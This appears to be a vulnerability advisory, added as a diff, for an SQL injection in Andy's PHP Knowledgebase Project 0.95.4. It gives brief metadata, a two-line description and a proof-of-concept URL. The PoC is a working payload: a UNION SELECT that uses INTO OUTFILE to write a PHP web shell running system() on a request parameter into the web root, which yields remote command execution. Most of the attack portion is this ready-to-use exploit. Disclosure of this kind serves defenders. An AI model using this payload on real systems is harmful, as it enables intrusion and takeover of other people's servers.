@@ -1,0 +1,23 @@
+------------------------------------------------------------------------
+Software................Andy's PHP Knowledgebase Project 0.95.4
+Vulnerability...........SQL Injection
+Threat Level............Critical (4/5)
+Download................http://www.aphpkb.org/
+Discovery Date..........3/27/2011
+Tested On...............Windows Vista + XAMPP
+------------------------------------------------------------------------
+Author..................AutoSec Tools
+Site....................http://www.autosectools.com/
+Email...................John Leitch <john@autosectools.com>
+------------------------------------------------------------------------
+
+
+--Description--
+
+A SQL injection vulnerability can be used to extract arbitrary data.
+In some environments it may be possible to create a PHP shell.
+
+
+--PoC--
+
+localhost/aphpkb/plugins/pdfClasses/pdfgen.php?pdfa='and%201=0%20UNION%20SELECT%20'<?php%20system($_GET["CMD"]);%20?>',''%20FROM%20dual%20INTO%20OUTFILE%20'../../htdocs/shell.php';%23
